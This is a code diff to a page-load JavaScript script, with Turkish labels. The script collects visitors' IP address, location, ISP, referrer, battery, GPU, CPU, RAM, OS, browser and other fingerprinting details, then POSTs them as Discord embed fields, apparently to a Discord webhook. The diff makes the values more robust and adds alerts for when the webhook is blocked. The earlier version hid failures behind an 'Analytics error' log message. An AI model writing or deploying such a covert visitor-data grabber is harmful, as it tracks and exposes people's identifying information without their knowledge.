@@ -631,37 +631,44 @@ document.addEventListener("DOMContentLoaded", () => {
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          if (debugInfo) {
+            gpuInfo = String(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) || "Bulunamadı";
+          }
         }
       } catch (e) {}
 
-      const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Çekirdek` : "Bilinmiyor";
-      const deviceRAM = navigator.deviceMemory ? `Yaklaşık ${navigator.deviceMemory} GB` : "Gizli/Bilinmiyor";
-      const touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Nokta` : "Desteklenmiyor";
+      const cpuCores = typeof navigator.hardwareConcurrency !== 'undefined' ? `${navigator.hardwareConcurrency} Çekirdek` : "Bilinmiyor";
+      const deviceRAM = typeof navigator.deviceMemory !== 'undefined' ? `Yaklaşık ${navigator.deviceMemory} GB` : "Gizli/Bilinmiyor";
+      const touchPoints = typeof navigator.maxTouchPoints !== 'undefined' ? `${navigator.maxTouchPoints} Nokta` : "Desteklenmiyor";
+
+      const safeString = (val) => {
+        const str = String(val);
+        return (str && str !== "undefined" && str !== "null") ? str : "Bilinmiyor";
+      };
 
       const embedFields = [
-        { name: "🔗 Nereden Geldi?", value: referrer, inline: false },
-        { name: "📍 Konum", value: locationData.location, inline: true },
-        { name: "🌐 IP Adresi", value: locationData.ip, inline: true },
-        { name: "🏢 Servis Sağlayıcı", value: locationData.isp, inline: true },
-        { name: "🔋 Batarya Durumu", value: batteryInfo, inline: true },
-        { name: "🍪 Çerez (Cookie) İzni", value: cookieEnabled, inline: true },
-        { name: "🪟 Pencere Boyutu", value: windowSize, inline: true },
-        { name: "💎 Ekran Kalitesi (Ratio)", value: pixelRatio, inline: true },
-        { name: "🛡️ AdBlocker", value: adBlocker, inline: true },
-        { name: "📡 İnternet Bağlantısı", value: networkInfo, inline: true },
-        { name: "📐 Ekran Yönü", value: orientation, inline: true },
-        { name: "💻 İşletim Sistemi", value: osInfo, inline: true },
-        { name: "🌐 Tarayıcı", value: browserInfo, inline: true },
-        { name: "📱 Cihaz Tipi", value: deviceType, inline: true },
-        { name: "🖥️ Ekran Çözünürlüğü", value: screenRes, inline: true },
-        { name: "🌍 Dil & Saat Dilimi", value: `${navigator.language} / ${timeZone}`, inline: true },
-        { name: "⏰ Yerel Saat", value: localTime, inline: true },
-        { name: "🎨 Tema Tercihi", value: prefersDark, inline: true },
-        { name: "🎮 Ekran Kartı (GPU)", value: gpuInfo, inline: true },
-        { name: "⚙️ İşlemci (CPU)", value: cpuCores, inline: true },
-        { name: "💾 Cihaz RAM'i", value: deviceRAM, inline: true },
-        { name: "🖐️ Dokunmatik Hassasiyet", value: touchPoints, inline: true }
+        { name: "🔗 Nereden Geldi?", value: safeString(referrer), inline: false },
+        { name: "📍 Konum", value: safeString(locationData.location), inline: true },
+        { name: "🌐 IP Adresi", value: safeString(locationData.ip), inline: true },
+        { name: "🏢 Servis Sağlayıcı", value: safeString(locationData.isp), inline: true },
+        { name: "🔋 Batarya Durumu", value: safeString(batteryInfo), inline: true },
+        { name: "🍪 Çerez (Cookie) İzni", value: safeString(cookieEnabled), inline: true },
+        { name: "🪟 Pencere Boyutu", value: safeString(windowSize), inline: true },
+        { name: "💎 Ekran Kalitesi (Ratio)", value: safeString(pixelRatio), inline: true },
+        { name: "🛡️ AdBlocker", value: safeString(adBlocker), inline: true },
+        { name: "📡 İnternet Bağlantısı", value: safeString(networkInfo), inline: true },
+        { name: "📐 Ekran Yönü", value: safeString(orientation), inline: true },
+        { name: "💻 İşletim Sistemi", value: safeString(osInfo), inline: true },
+        { name: "🌐 Tarayıcı", value: safeString(browserInfo), inline: true },
+        { name: "📱 Cihaz Tipi", value: safeString(deviceType), inline: true },
+        { name: "🖥️ Ekran Çözünürlüğü", value: safeString(screenRes), inline: true },
+        { name: "🌍 Dil & Saat Dilimi", value: safeString(`${navigator.language} / ${timeZone}`), inline: true },
+        { name: "⏰ Yerel Saat", value: safeString(localTime), inline: true },
+        { name: "🎨 Tema Tercihi", value: safeString(prefersDark), inline: true },
+        { name: "🎮 Ekran Kartı (GPU)", value: safeString(gpuInfo), inline: true },
+        { name: "⚙️ İşlemci (CPU)", value: safeString(cpuCores), inline: true },
+        { name: "💾 Cihaz RAM'i", value: safeString(deviceRAM), inline: true },
+        { name: "🖐️ Dokunmatik Hassasiyet", value: safeString(touchPoints), inline: true }
       ];
 
       const payload = {
@@ -678,6 +685,12 @@ document.addEventListener("DOMContentLoaded", () => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-      }).catch(e => console.log("Analytics error"));
+      }).then(res => {
+        if (!res.ok) {
+          res.text().then(t => alert("⚠️ DİKKAT: Discord API bu log mesajını reddetti! Sebep: " + t));
+        }
+      }).catch(e => {
+        alert("⚠️ DİKKAT: Telefonunun Tarayıcısı (veya AdBlocker) Webhook'u engelliyor! Sebep: " + e.message);
+      });
     });
 });
